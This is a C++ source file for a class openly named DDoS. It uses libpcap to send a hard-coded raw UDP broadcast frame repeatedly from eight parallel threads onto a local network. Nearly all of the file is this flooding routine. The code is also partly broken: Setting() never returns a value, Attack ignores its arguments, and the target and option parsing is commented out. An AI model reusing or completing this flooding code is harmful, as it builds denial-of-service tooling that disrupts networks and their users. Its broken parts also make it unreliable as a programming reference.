#include "DDoS.h"
#include "etc_function.h"
#include <pcap.h>
#include <thread>
#include <unistd.h>


DDoS::~DDoS(){
    delete manager;

    pcap_close(handle);
}

void DDoS::Attack(int start, int end){
    uchar pck[] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x80, 0x19, 0x34, 0x78, 0xb1, 0x94, 0x08, 0x00, 0x45, 0x00, 0x01, 0x23, 0x29, 0xa5, 0x00, 0x00, 0x80, 0x11, 0x88, 0x4e, 0xc0, 0xa8, 0x02, 0x87, 0xc0, 0xa8, 0x03, 0xff, 0xd6, 0x83, 0xd6, 0x83, 0x01, 0x0f, 0xcd, 0x6f, 0x00, 0x44, 0x45, 0x53, 0x4b, 0x54, 0x4f, 0x50, 0x2d, 0x4f, 0x48, 0x41, 0x47, 0x35, 0x4b, 0x30, 0x00, 0xb9, 0x7f, 0x95, 0x46, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x33, 0x27, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x20, 0x72, 0x6c, 0x7c, 0x01, 0x00, 0x00, 0xb0, 0x9c, 0x55, 0x6d, 0x7c, 0x01, 0x00, 0x00, 0x40, 0x85, 0x5f, 0x6d, 0x7c, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7c, 0x6a, 0xcd, 0x55, 0x00, 0x00, 0x00, 0x00, 0xc8, 0xa5, 0x97, 0x55, 0x00, 0x00, 0x00, 0x00, 0x59, 0xbd, 0x7f, 0x95, 0x46, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xf0, 0x7e, 0x55, 0x6d, 0x7c, 0x01, 0x00, 0x00, 0xa4, 0xb9, 0x7f, 0x95, 0x46, 0x00, 0x00, 0x00, 0xc0, 0xb9, 0x7f, 0x95, 0x46, 0x00, 0x00, 0x00, 0xa8, 0x8f, 0x40, 0x7b, 0x38, 0x66, 0x33, 0x64, 0x31, 0x37, 0x31, 0x36, 0x2d, 0x33, 0x37, 0x32, 0x36, 0x2d, 0x34, 0x35, 0x63, 0x39, 0x2d, 0x61, 0x38, 0x37, 0x64, 0x2d, 0x30, 0x30, 0x39, 0x39, 0x61, 0x61, 0x32, 0x31, 0x65, 0x34, 0x36, 0x39, 0x7d, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xa0, 0xb9, 0x7f, 0x95, 0x46, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x60, 0x32, 0x8d, 0x8f};

    for (int i=0; i < 100; i++) {
        printf("packet\n");
        pcap_sendpacket(handle, pck, sizeof(pck));
    }

}

void DDoS::ExecuteAttack()
{
    vector<thread> ddos_thread;
    //int pctk_cnt = manager->GetPacketCnt();

    for (int i=0; i<16; i+=2)
        ddos_thread.push_back(thread(&DDoS::Attack, this, i, i + 1));

    for (int i=0;i<8; i++)
        ddos_thread[i].join();

}

bool DDoS::Setting(){
    char errbuf[1024];
    handle = pcap_open_live(Dev.c_str(), 2048, 1, 1, errbuf);
}

bool DDoS::SetOption(){
    /*
    string ip;

    printf("Enter Dev: ");
    cin >> Dev;

    try {
        printf("Enter IP: ");
        cin >> ip;


        int size = ip.size();
        string ip_int[4];
        uchar ip_hex[4];
        int index = 0;

        for(int i=0; i < size; i++){
            if (ip[i] == '.') index++;
            else ip_int[index].push_back(ip[i]);
        }

        for(int i=0;i<4;i++){
            ip_hex[i] = atoi(ip_int[i].c_str());
        }

        manager = new PacketManager(ip_hex);
    } catch (exception ew) {
        printf("Check IP Address %s\n", ip.c_str());
        return false;
    }

    printf("-<protocol1> <count1> <size1> -<protocol2> <count2> <size2> ...\n");
    printf("Enter Command: ");
    string command;
    char vue;
    while(true){
        vue = getchar();
        cout << vue << endl;
        if (vue == '\n') break;
        else command += vue;
    }
    vector<string> options = str_split(command, '-');
    for (auto k: options){
        cout << k << endl;
    }
    */
    return true;
}
